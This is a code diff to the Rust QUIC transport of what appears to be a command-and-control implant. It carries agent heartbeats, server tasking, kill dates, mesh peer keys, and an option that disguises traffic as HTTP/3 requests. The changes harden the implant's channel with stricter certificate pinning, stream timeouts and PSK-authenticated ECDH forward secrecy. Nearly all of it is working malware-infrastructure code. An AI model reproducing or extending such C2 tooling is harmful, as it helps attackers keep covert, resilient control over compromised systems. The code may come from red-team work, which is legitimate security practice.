@@ -42,6 +42,7 @@
 use anyhow::{anyhow, Context, Result};
 use async_trait::async_trait;
 use common::config::QuicC2Profile;
+use common::lock::MutexExt;
 use common::{CryptoSession, Message, Transport};
 use quinn::Endpoint;
 use sha2::Digest;
@@ -108,7 +109,7 @@ fn build_tls_client_config(profile: &QuicC2Profile) -> Result<rustls::ClientConf
         tls_config
             .dangerous()
             .set_certificate_verifier(Arc::new(AcceptAnyCertVerifier));
-        log::warn!(
+        tracing::warn!(
             "QUIC TLS: insecure mode — accepting any server certificate (testing only)"
         );
     } else if profile.cert_pinning {
@@ -117,13 +118,18 @@ fn build_tls_client_config(profile: &QuicC2Profile) -> Result<rustls::ClientConf
             .set_certificate_verifier(Arc::new(FingerprintCertVerifier {
                 expected_fingerprint: profile.cert_fingerprint.clone(),
             }));
-        log::debug!("QUIC TLS: certificate pinning enabled");
+        tracing::debug!("QUIC TLS: certificate pinning enabled");
     }
 
     Ok(tls_config)
 }
 
 /// Certificate verifier that accepts any certificate (insecure / testing).
+///
+/// **Note:** While `verify_server_cert` accepts any end-entity certificate
+/// (this is the intended testing behaviour), TLS signature verification is
+/// still delegated to the real `rustls` crypto primitives so that we don't
+/// silently accept forged signatures.
 #[derive(Debug)]
 struct AcceptAnyCertVerifier;
 
@@ -141,38 +147,47 @@ impl rustls::client::danger::ServerCertVerifier for AcceptAnyCertVerifier {
 
     fn verify_tls12_signature(
         &self,
-        _message: &[u8],
-        _cert: &rustls::pki_types::CertificateDer<'_>,
-        _dss: &rustls::DigitallySignedStruct,
+        message: &[u8],
+        cert: &rustls::pki_types::CertificateDer<'_>,
+        dss: &rustls::DigitallySignedStruct,
     ) -> std::result::Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error>
     {
-        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
+        rustls::crypto::verify_tls12_signature(
+            message,
+            cert,
+            dss,
+            &rustls::crypto::ring::default_provider().signature_verification_algorithms,
+        )
     }
 
     fn verify_tls13_signature(
         &self,
-        _message: &[u8],
-        _cert: &rustls::pki_types::CertificateDer<'_>,
-        _dss: &rustls::DigitallySignedStruct,
+        message: &[u8],
+        cert: &rustls::pki_types::CertificateDer<'_>,
+        dss: &rustls::DigitallySignedStruct,
     ) -> std::result::Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error>
     {
-        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
+        rustls::crypto::verify_tls13_signature(
+            message,
+            cert,
+            dss,
+            &rustls::crypto::ring::default_provider().signature_verification_algorithms,
+        )
     }
 
     fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
-        vec![
-            rustls::SignatureScheme::ECDSA_NISTP256_SHA256,
-            rustls::SignatureScheme::ECDSA_NISTP384_SHA384,
-            rustls::SignatureScheme::RSA_PSS_SHA256,
-            rustls::SignatureScheme::RSA_PSS_SHA384,
-            rustls::SignatureScheme::RSA_PKCS1_SHA256,
-            rustls::SignatureScheme::RSA_PKCS1_SHA384,
-        ]
+        rustls::crypto::ring::default_provider()
+            .signature_verification_algorithms
+            .supported_schemes()
     }
 }
 
 /// Certificate verifier that pins the server certificate by its SHA-256
 /// fingerprint. Uses constant-time comparison to prevent timing side-channels.
+///
+/// Also validates the certificate's hostname/SAN against the expected server
+/// name and checks the certificate validity period, matching the verification
+/// strength of the HTTP/TLS transports.
 #[derive(Debug)]
 struct FingerprintCertVerifier {
     expected_fingerprint: String,
@@ -183,9 +198,9 @@ impl rustls::client::danger::ServerCertVerifier for FingerprintCertVerifier {
         &self,
         end_entity: &rustls::pki_types::CertificateDer<'_>,
         _intermediates: &[rustls::pki_types::CertificateDer<'_>],
-        _server_name: &rustls::pki_types::ServerName<'_>,
+        server_name: &rustls::pki_types::ServerName<'_>,
         _ocsp_response: &[u8],
-        _now: rustls::pki_types::UnixTime,
+        now: rustls::pki_types::UnixTime,
     ) -> std::result::Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
         let digest = sha2::Sha256::digest(end_entity.as_ref());
         let hex_fp = hex::encode(digest);
@@ -197,44 +212,77 @@ impl rustls::client::danger::ServerCertVerifier for FingerprintCertVerifier {
                 .as_bytes()
                 .ct_eq(expected_lower.as_bytes()),
         ) {
-            log::error!("QUIC cert pinning: fingerprint mismatch — rejecting connection");
+            tracing::error!("QUIC cert pinning: fingerprint mismatch — rejecting connection");
             return Err(rustls::Error::InvalidCertificate(
                 rustls::CertificateError::UnknownIssuer,
             ));
         }
-        log::debug!("QUIC cert pinning: fingerprint matched");
+        tracing::debug!("QUIC cert pinning: fingerprint matched");
+
+        // Verify hostname/SAN — same check applied by the HTTP and TLS transports.
+        if !common::tls_transport::verify_cert_hostname(end_entity.as_ref(), server_name) {
+            tracing::warn!(
+                "QUIC cert pinning: fingerprint matched but hostname validation failed"
+            );
+            return Err(rustls::Error::InvalidCertificate(
+                rustls::CertificateError::NotValidForName,
+            ));
+        }
+
+        // Reject certificates outside their validity window.
+        if let Some((not_before, not_after)) =
+            common::tls_transport::cert_validity_period(end_entity.as_ref())
+        {
+            let now_secs = now.as_secs() as i64;
+            if now_secs < not_before {
+                return Err(rustls::Error::InvalidCertificate(
+                    rustls::CertificateError::NotValidYet,
+                ));
+            }
+            if now_secs > not_after {
+                return Err(rustls::Error::InvalidCertificate(
+                    rustls::CertificateError::Expired,
+                ));
+            }
+        }
+
         Ok(rustls::client::danger::ServerCertVerified::assertion())
     }
 
     fn verify_tls12_signature(
         &self,
-        _message: &[u8],
-        _cert: &rustls::pki_types::CertificateDer<'_>,
-        _dss: &rustls::DigitallySignedStruct,
+        message: &[u8],
+        cert: &rustls::pki_types::CertificateDer<'_>,
+        dss: &rustls::DigitallySignedStruct,
     ) -> std::result::Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error>
     {
-        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
+        rustls::crypto::verify_tls12_signature(
+            message,
+            cert,
+            dss,
+            &rustls::crypto::ring::default_provider().signature_verification_algorithms,
+        )
     }
 
     fn verify_tls13_signature(
         &self,
-        _message: &[u8],
-        _cert: &rustls::pki_types::CertificateDer<'_>,
-        _dss: &rustls::DigitallySignedStruct,
+        message: &[u8],
+        cert: &rustls::pki_types::CertificateDer<'_>,
+        dss: &rustls::DigitallySignedStruct,
     ) -> std::result::Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error>
     {
-        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
+        rustls::crypto::verify_tls13_signature(
+            message,
+            cert,
+            dss,
+            &rustls::crypto::ring::default_provider().signature_verification_algorithms,
+        )
     }
 
     fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
-        vec![
-            rustls::SignatureScheme::ECDSA_NISTP256_SHA256,
-            rustls::SignatureScheme::ECDSA_NISTP384_SHA384,
-            rustls::SignatureScheme::RSA_PSS_SHA256,
-            rustls::SignatureScheme::RSA_PSS_SHA384,
-            rustls::SignatureScheme::RSA_PKCS1_SHA256,
-            rustls::SignatureScheme::RSA_PKCS1_SHA384,
-        ]
+        rustls::crypto::ring::default_provider()
+            .signature_verification_algorithms
+            .supported_schemes()
     }
 }
 
@@ -337,7 +385,7 @@ impl QuicClient {
     /// Performs the full QUIC + TLS 1.3 handshake. Returns a `QuicConnection`
     /// that can be used for sending and receiving framed messages.
     pub async fn connect(&self) -> Result<QuicConnection> {
-        log::debug!(
+        tracing::debug!(
             "QUIC: connecting to {} ({}) with ALPN {:?}",
             self.server_addr,
             self.server_name,
@@ -353,7 +401,7 @@ impl QuicClient {
             .await
             .context("QUIC connection failed (UDP may be blocked or server unreachable)")?;
 
-        log::info!(
+        tracing::info!(
             "QUIC: connected to {} ({}), local addr: {}",
             self.server_addr,
             self.server_name,
@@ -413,7 +461,7 @@ impl QuicConnection {
         send.finish()
             .context("failed to close QUIC stream send side")?;
 
-        log::debug!(
+        tracing::debug!(
             "QUIC: sent framed message ({} bytes ciphertext) on new stream",
             ciphertext.len()
         );
@@ -425,11 +473,18 @@ impl QuicConnection {
     ///
     /// Accepts an incoming bidirectional stream, reads the 4-byte length
     /// prefix, then reads the encrypted payload.
+    ///
+    /// The `accept_bi()` call is guarded by a timeout (2× the configured idle
+    /// timeout) to prevent indefinite blocking when the server becomes
+    /// unreachable (MED-001).
     pub async fn recv_framed(&self) -> Result<Vec<u8>> {
-        let stream = self
-            .connection
-            .accept_bi()
+        let accept_timeout = Duration::from_secs(self.profile.idle_timeout_secs * 2);
+        let stream = tokio::time::timeout(accept_timeout, self.connection.accept_bi())
             .await
+            .context(format!(
+                "QUIC accept_bi timed out after {}s — server may be unreachable",
+                accept_timeout.as_secs()
+            ))?
             .context("failed to accept QUIC bidirectional stream")?;
 
         let (mut send, mut recv) = stream;
@@ -471,7 +526,7 @@ impl QuicConnection {
             .await
             .context("failed to read QUIC frame payload")?;
 
-        log::debug!(
+        tracing::debug!(
             "QUIC: received framed message ({} bytes ciphertext)",
             payload_len
         );
@@ -587,7 +642,7 @@ impl<'a> H3Compat<'a> {
         send.finish()
             .context("H3Compat: failed to close stream")?;
 
-        log::debug!(
+        tracing::debug!(
             "H3Compat: sent POST {} ({} bytes body + {} bytes headers)",
             self.connection.profile.h3_path,
             ciphertext.len(),
@@ -602,12 +657,18 @@ impl<'a> H3Compat<'a> {
     /// Reads the response from an accepted bidirectional stream.
     /// Expects the same simplified framing: length-prefixed header block
     /// followed by the encrypted response body.
+    ///
+    /// The `accept_bi()` call is guarded by a timeout (2× the configured idle
+    /// timeout) to prevent indefinite blocking when the server becomes
+    /// unreachable (MED-001).
     pub async fn recv_response(&self) -> Result<Vec<u8>> {
-        let stream = self
-            .connection
-            .connection
-            .accept_bi()
+        let accept_timeout = Duration::from_secs(self.connection.profile.idle_timeout_secs * 2);
+        let stream = tokio::time::timeout(accept_timeout, self.connection.connection.accept_bi())
             .await
+            .context(format!(
+                "H3Compat: accept_bi timed out after {}s — server may be unreachable",
+                accept_timeout.as_secs()
+            ))?
             .context("H3Compat: failed to accept QUIC stream")?;
 
         let (mut send, mut recv) = stream;
@@ -651,7 +712,7 @@ impl<'a> H3Compat<'a> {
 
         let _ = send.finish();
 
-        log::debug!(
+        tracing::debug!(
             "H3Compat: received response ({} bytes body + {} bytes headers)",
             body_len,
             header_len,
@@ -703,6 +764,9 @@ pub struct QuicTransport {
     connection: Option<QuicConnection>,
     /// CryptoSession for encrypting/decrypting messages.
     session: CryptoSession,
+    /// HIGH-001: ECDH forward-secrecy state. `Some` while the ECDH handshake
+    /// is in progress. Set to `None` once the session key has been derived.
+    ecdh_client: Option<std::sync::Mutex<common::forward_secrecy::HttpEcdhClient>>,
     /// Agent identifier (sent in heartbeat messages).
     agent_id: String,
     /// Optional mesh public key for P2P link establishment.
@@ -730,28 +794,43 @@ impl QuicTransport {
     /// * `agent_id` — Unique agent identifier.
     /// * `mesh_public_key` — Optional mesh public key for P2P networking.
     /// * `kill_date` — Kill date in YYYY-MM-DD format (empty = disabled).
+    /// * `psk` — Pre-shared key for ECDH forward-secrecy authentication.
+    ///   If empty, the `session` is used as-is with no ECDH upgrade.
     pub fn new(
         profile: &QuicC2Profile,
         session: CryptoSession,
         agent_id: String,
         mesh_public_key: Option<[u8; 32]>,
         kill_date: String,
+        psk: &str,
     ) -> Result<Self> {
         let h3_compat = profile.h3_compat;
         let client = QuicClient::new(profile)?;
 
-        log::info!(
-            "QUIC transport initialized: endpoint={}, port={}, alpn={}, h3_compat={}",
+        // HIGH-001: initialise ECDH forward-secrecy client if a PSK is
+        // provided.  The handshake piggybacks on the normal send/recv cycle.
+        let ecdh_client = if !psk.is_empty() {
+            Some(std::sync::Mutex::new(
+                common::forward_secrecy::HttpEcdhClient::new(psk.as_bytes()),
+            ))
+        } else {
+            None
+        };
+
+        tracing::info!(
+            "QUIC transport initialized: endpoint={}, port={}, alpn={}, h3_compat={}, ecdh={}",
             profile.endpoint,
             profile.port,
             profile.alpn,
             h3_compat,
+            ecdh_client.is_some(),
         );
 
         Ok(Self {
             client,
             connection: None,
             session,
+            ecdh_client,
             agent_id,
             mesh_public_key,
             kill_date,
@@ -771,7 +850,7 @@ impl QuicTransport {
             if conn.is_alive() {
                 return Ok(());
             }
-            log::warn!("QUIC: connection lost; reconnecting...");
+            tracing::warn!("QUIC: connection lost; reconnecting...");
             self.connection = None;
         }
 
@@ -780,13 +859,13 @@ impl QuicTransport {
         self.connection = Some(conn);
         self.backoff_secs = 1; // Reset backoff on success.
 
-        log::info!("QUIC: connection established");
+        tracing::info!("QUIC: connection established");
         Ok(())
     }
 
     /// Handle a connection failure with exponential backoff.
     async fn handle_connection_failure(&mut self, e: anyhow::Error) -> anyhow::Error {
-        log::warn!("QUIC: connection error: {}; backing off {}s", e, self.backoff_secs);
+        tracing::warn!("QUIC: connection error: {}; backing off {}s", e, self.backoff_secs);
         self.connection = None;
 
         let backoff = Duration::from_secs(self.backoff_secs);
@@ -804,7 +883,7 @@ impl QuicTransport {
 
     /// Serialize, encrypt, and frame a message for QUIC transport.
     fn prepare_outbound(&self, msg: Message) -> Result<Vec<u8>> {
-        let serialized = bincode::serialize(&msg)
+        let serialized = bincode::serde::encode_to_vec(&msg, bincode::config::legacy())
             .context("failed to serialize message for QUIC transport")?;
         let ciphertext = self.session.encrypt(&serialized);
         Ok(ciphertext)
@@ -816,7 +895,7 @@ impl QuicTransport {
             .session
             .decrypt(ciphertext)
             .map_err(|e| anyhow!("QUIC decrypt failed: {:?}", e))?;
-        let msg: Message = bincode::deserialize(&plaintext)
+        let msg: Message = bincode::serde::decode_from_slice(&plaintext, bincode::config::legacy()).map(|(v, _)| v)
             .context("failed to deserialize message from QUIC transport")?;
         Ok(msg)
     }
@@ -825,7 +904,7 @@ impl QuicTransport {
 #[async_trait]
 impl Transport for QuicTransport {
     async fn send(&mut self, msg: Message) -> Result<()> {
-        log::debug!("QUIC C2 Send");
+        tracing::debug!("QUIC C2 Send");
 
         // Enforce kill date on every send cycle.
         if !self.kill_date.is_empty() {
@@ -833,7 +912,19 @@ impl Transport for QuicTransport {
         }
 
         // Prepare the encrypted payload.
-        let ciphertext = self.prepare_outbound(msg)?;
+        let mut ciphertext = self.prepare_outbound(msg)?;
+
+        // HIGH-001: If an ECDH handshake is in progress, prepend the binary
+        // ECDH frame so the server can derive the shared session key.
+        if let Some(ecdh) = self.ecdh_client.as_ref() {
+            let mut ecdh_guard = ecdh.lock_recover();
+            let ecdh_b64 = ecdh_guard.header_value();
+            let frame =
+                common::forward_secrecy::encode_ecdh_bin_frame(&ecdh_b64);
+            let mut combined = frame;
+            combined.append(&mut ciphertext);
+            ciphertext = combined;
+        }
 
         // Ensure we have a connection.
         if let Err(e) = self.ensure_connected().await {
@@ -855,7 +946,7 @@ impl Transport for QuicTransport {
         match result {
             Ok(()) => {
                 self.record_success();
-                log::debug!("QUIC: message sent successfully ({} bytes)", ciphertext.len());
+                tracing::debug!("QUIC: message sent successfully ({} bytes)", ciphertext.len());
                 Ok(())
             }
             Err(e) => {
@@ -865,7 +956,7 @@ impl Transport for QuicTransport {
     }
 
     async fn recv(&mut self) -> Result<Message> {
-        log::debug!("QUIC C2 Recv");
+        tracing::debug!("QUIC C2 Recv");
 
         // Enforce kill date on every recv cycle.
         if !self.kill_date.is_empty() {
@@ -903,17 +994,37 @@ impl Transport for QuicTransport {
         }
 
         // Wait for the server's response (tasking).
-        let ciphertext = if self.h3_compat {
+        let mut ciphertext = if self.h3_compat {
             let h3 = H3Compat::new(conn);
             h3.recv_response().await?
         } else {
             conn.recv_framed().await?
         };
 
+        // HIGH-001: If an ECDH handshake is in progress, check whether the
+        // server replied with an ECDH frame.  When found, derive the shared
+        // session key and upgrade `self.session`.  The remaining bytes after
+        // the ECDH frame are the actual encrypted message.
+        if let Some(ecdh) = self.ecdh_client.as_ref() {
+            if let Some((server_b64, remainder)) =
+                common::forward_secrecy::try_extract_ecdh_bin_frame(&ciphertext)
+            {
+                let mut ecdh_guard = ecdh.lock_recover();
+                self.session = ecdh_guard
+                    .derive_session_from_response(&server_b64)
+                    .context("QUIC ECDH: failed to derive session from server response")?;
+                // ECDH handshake complete — tear down the client state.
+                drop(ecdh_guard);
+                self.ecdh_client = None;
+                tracing::info!("QUIC: ECDH forward-secrecy session established");
+                ciphertext = remainder.to_vec();
+            }
+        }
+
         let msg = self.process_inbound(&ciphertext)?;
         self.record_success();
 
-        log::debug!("QUIC: message received successfully");
+        tracing::debug!("QUIC: message received successfully");
         Ok(msg)
     }
 }
@@ -944,6 +1055,7 @@ mod tests {
             h3_path: "/api/v1/test".to_string(),
             h3_headers: std::collections::HashMap::new(),
             max_concurrent_streams: 4,
+            psk: String::new(),
         }
     }
 
@@ -999,10 +1111,10 @@ mod tests {
             mesh_public_key: None,
         };
 
-        let serialized = bincode::serialize(&msg).unwrap();
+        let serialized = bincode::serde::encode_to_vec(&msg, bincode::config::legacy()).unwrap();
         let ciphertext = session.encrypt(&serialized);
         let plaintext = session.decrypt(&ciphertext).unwrap();
-        let deserialized: Message = bincode::deserialize(&plaintext).unwrap();
+        let deserialized: Message = bincode::serde::decode_from_slice(&plaintext, bincode::config::legacy()).map(|(v, _)| v).unwrap();
 
         if let Message::Heartbeat {
             timestamp,
